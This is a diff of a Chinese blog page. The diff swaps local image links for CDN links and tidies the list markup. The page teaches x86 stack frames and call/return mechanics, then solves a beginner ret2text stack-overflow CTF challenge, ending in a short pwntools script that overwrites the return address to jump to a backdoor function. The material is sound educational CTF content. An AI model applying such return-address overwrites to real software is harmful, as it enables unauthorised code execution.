@@ -23,23 +23,23 @@
 <meta property="og:site_name" content="能打八个攻城狮">
 <meta property="og:description" content="认识栈结构栈这种结构学过数据结构的都知道，是一种先进后出的结构，类似于子弹放进弹夹一样，先放进的子弹最后打出。 函数调用过程这个知识是整个栈方面的关键知识，我在大一的时候学pwn怎么也学不会，就是忽略了对基础知识的学习，直接学漏洞，一直搞不清怎么回事，非常郁闷。现在详细总结一下函数调用过程，以X86系统为例  压入参数根据调用约定压入参数，main函数作为调用者，首先将fun的参数a,b…压栈。栈">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240615145957921-1237740954.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240615145935251-58146433.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240615151711628-1251544727.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240616153452139-148592813.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240616153558140-1955505298.png">
-<meta property="og:image" content="http://example.com/%5C%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA%5C1.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240616154222037-23893821.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240616154349804-1239461694.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240616154515354-1776521236.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240616154752242-424300469.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/4-20240616154930333-1601063843.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341420.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341909.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342005.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342145.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343292.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346316.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343102.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344907.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344504.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344083.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182345121.png">
 <meta property="article:published_time" content="2024-07-18T08:03:56.000Z">
-<meta property="article:modified_time" content="2024-07-18T13:43:24.209Z">
+<meta property="article:modified_time" content="2024-07-18T15:52:07.705Z">
 <meta property="article:author" content="TKYmax">
 <meta property="article:tag" content="栈">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/07/18/hello-world/4-20240615145957921-1237740954.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341420.png">
   
   
   
@@ -319,9 +319,9 @@
 </li>
 <li><p>返回地址压入<br><strong>fun函数调用完成，程序需要返回源地址继续执行程序，那么我们就去要保存调用函数下一句的地址，把它压入栈中，以便我们恢复原程序继续执行</strong></p>
 </li>
-<li><p>fun函数运行<br><strong>fun函数运行会给自己再开辟一个栈，这个栈的栈底就是上个栈的栈顶，因为当调用函数时，执行call命令，会执行这几条汇编‘push edp；mov edp ，esp；sub esp，0x ’这句话可以画图来体会一下。push edp；是为了保存调用函数的栈帧，调用函数结束后要恢复原函数的edp，esp。mov edp ，esp；把esp的值赋值给edp，这样就把新栈帧的栈底确定了。sub esp ，0x，这句话为栈开辟空间，esp就确定了，完成一个新栈开辟</strong><br><img src="/2024/07/18/hello-world/4-20240615145957921-1237740954.png" srcset="/img/loading.gif" lazyload></p>
+<li><p>fun函数运行<br><strong>fun函数运行会给自己再开辟一个栈，这个栈的栈底就是上个栈的栈顶，因为当调用函数时，执行call命令，会执行这几条汇编‘push edp；mov edp ，esp；sub esp，0x ’这句话可以画图来体会一下。push edp；是为了保存调用函数的栈帧，调用函数结束后要恢复原函数的edp，esp。mov edp ，esp；把esp的值赋值给edp，这样就把新栈帧的栈底确定了。sub esp ，0x，这句话为栈开辟空间，esp就确定了，完成一个新栈开辟</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341420.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li><p>fun函数返回<br><strong>当函数运行完成之后，函数这么返回呢？函数一般会执行‘leave；ret；’这句话什么含义，就是‘mov esp ，edp；pop edp；pop eip’ 我们来解读一下，首先把栈顶移动到栈底，相当于恢复栈顶，仔细想一想，是不是fun调用的时候，把edp移动到esp。然后pop edp 把栈中压入的main_edp弹出赋值给edp，这样我们就恢复了edp，然后再pop eip，把压入的main_addr弹出赋值给eip程序控制流就有回到了call的下一句</strong><br><img src="/2024/07/18/hello-world/4-20240615145935251-58146433.png" srcset="/img/loading.gif" lazyload></p>
+<li><p>fun函数返回<br><strong>当函数运行完成之后，函数这么返回呢？函数一般会执行‘leave；ret；’这句话什么含义，就是‘mov esp ，edp；pop edp；pop eip’ 我们来解读一下，首先把栈顶移动到栈底，相当于恢复栈顶，仔细想一想，是不是fun调用的时候，把edp移动到esp。然后pop edp 把栈中压入的main_edp弹出赋值给edp，这样我们就恢复了edp，然后再pop eip，把压入的main_addr弹出赋值给eip程序控制流就有回到了call的下一句</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341909.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <h3 id="函数调用过程中涉及操作指令"><a href="#函数调用过程中涉及操作指令" class="headerlink" title="函数调用过程中涉及操作指令"></a>函数调用过程中涉及操作指令</h3><ol>
@@ -331,11 +331,15 @@
 <li><strong>离开(1eave):恢复主调函数的栈帧以准备返回，它等价于以下指令序列:mov esp，ebp(恢复原esp值，指向被调函数栈帧开始处); pop ebp(恢复原 ebp 的值，即主调函数帧基指针)</strong></li>
 <li><strong>返回(ret):与ca11指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前 ca11指令保存的下条指令地址)到eip寄存器中，程序转到该地址处继续执行(此时 esp指向进人函数时的第一个参数)。若带有立即数，esp要加上立即数(丢弃一些在执行ca11指令前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前ca11指令保存的返回地址。</strong></li>
 </ol>
-<h2 id="初识栈溢出"><a href="#初识栈溢出" class="headerlink" title="初识栈溢出"></a>初识栈溢出</h2><p><strong>当我们调用一个函数的时候，在函数内部存在，栈溢出漏洞，get函数或者开辟空间大于变量距离栈底的位置，那么就可能造成栈溢出，溢出后如果溢出值覆盖了main_addr,函数的返回地址就会变化，我们可以根据这个特点，篡改返回地址到我们想返回的。看下图，距离栈底0x80个字节，但是允许读取0x200个字节，就会造成栈溢出,接下来我们来小试牛刀</strong><br><img src="/2024/07/18/hello-world/4-20240615151711628-1251544727.png" srcset="/img/loading.gif" lazyload><br>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text</a><br><img src="/2024/07/18/hello-world/4-20240616153452139-148592813.png" srcset="/img/loading.gif" lazyload><br><strong>查看保护</strong><br><strong>打开IDA反编译看看代码逻辑</strong><br><img src="/2024/07/18/hello-world/4-20240616153558140-1955505298.png" srcset="/img/loading.gif" lazyload><br><strong>这里有两种判断偏移的方式</strong></p>
+<h2 id="初识栈溢出"><a href="#初识栈溢出" class="headerlink" title="初识栈溢出"></a>初识栈溢出</h2><p><strong>当我们调用一个函数的时候，在函数内部存在，栈溢出漏洞，get函数或者开辟空间大于变量距离栈底的位置，那么就可能造成栈溢出，溢出后如果溢出值覆盖了main_addr,函数的返回地址就会变化，我们可以根据这个特点，篡改返回地址到我们想返回的。看下图，距离栈底0x80个字节，但是允许读取0x200个字节，就会造成栈溢出,接下来我们来小试牛刀</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342005.png" srcset="/img/loading.gif" lazyload><br>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342145.png" srcset="/img/loading.gif" lazyload><br><strong>查看保护</strong><br><strong>打开IDA反编译看看代码逻辑</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343292.png" srcset="/img/loading.gif" lazyload><br><strong>这里有两种判断偏移的方式</strong></p>
 <ol>
-<li>第一种就是看图片上红框部分，显示s距离ebp为0x108个字节所以需要填充0x108+0x4个字节的数据才能覆盖返回地址</li>
-<li>使用pwngdb中cyclic判断偏移，在call gets处下断点，用gdb调试<img src="/%5C%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA%5C1.png" srcset="/img/loading.gif" lazyload><br>用cyclic生成有规律的字符串，输入c把字符串输入运行<img src="/2024/07/18/hello-world/4-20240616154222037-23893821.png" srcset="/img/loading.gif" lazyload><br>得到一个异常返回地址，程序停止<img src="/2024/07/18/hello-world/4-20240616154349804-1239461694.png" srcset="/img/loading.gif" lazyload><br>用命令cyclic -l 加返回地址算出偏移<img src="/2024/07/18/hello-world/4-20240616154515354-1776521236.png" srcset="/img/loading.gif" lazyload><br>这里的到的偏移就不用算edp的大小了，因为已经包括edp了<br><strong>有了偏移我们找一下后门函数</strong><img src="/2024/07/18/hello-world/4-20240616154752242-424300469.png" srcset="/img/loading.gif" lazyload><br><strong>这题也算很仁慈，直接给出了后门函数，我们随着学习的深入，一般不会直接给出后门函数，需要使用各种技巧来进入shell</strong><br><img src="/2024/07/18/hello-world/4-20240616154930333-1601063843.png" srcset="/img/loading.gif" lazyload><br><strong>接下来开始编写脚本</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2text&quot;)<br>target = 0x0804850B<br>p.recvuntil(&quot;ret2text\n&quot;)<br>payload = b&quot;a&quot; * 0x108 + p32(1) + p32(target)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure></li>
+<li><p>第一种就是看图片上红框部分，显示s距离ebp为0x108个字节所以需要填充0x108+0x4个字节的数据才能覆盖返回地址</p>
+</li>
+<li><p>使用pwngdb中cyclic判断偏移，在call gets处下断点，用gdb调试<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346316.png" srcset="/img/loading.gif" lazyload><br>  用cyclic生成有规律的字符串，输入c把字符串输入运行<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343102.png" srcset="/img/loading.gif" lazyload><br>  得到一个异常返回地址，程序停止<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344907.png" srcset="/img/loading.gif" lazyload><br>  用命令cyclic -l 加返回地址算出偏移<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344504.png" srcset="/img/loading.gif" lazyload><br>  <strong>这里的到的偏移就不用算edp的大小了，因为已经包括edp了</strong><br>  <strong>有了偏移我们找一下后门函数</strong></p>
+</li>
 </ol>
+<p>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344083.png" srcset="/img/loading.gif" lazyload><br>  <strong>这题也算很仁慈，直接给出了后门函数，我们随着学习的深入，一般不会直接给出后门函数，需要使用各种技巧来进入shell</strong><br>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182345121.png" srcset="/img/loading.gif" lazyload><br>  <strong>接下来开始编写脚本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2text&quot;)<br>target = 0x0804850B<br>p.recvuntil(&quot;ret2text\n&quot;)<br>payload = b&quot;a&quot; * 0x108 + p32(1) + p32(target)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
                 
               </div>
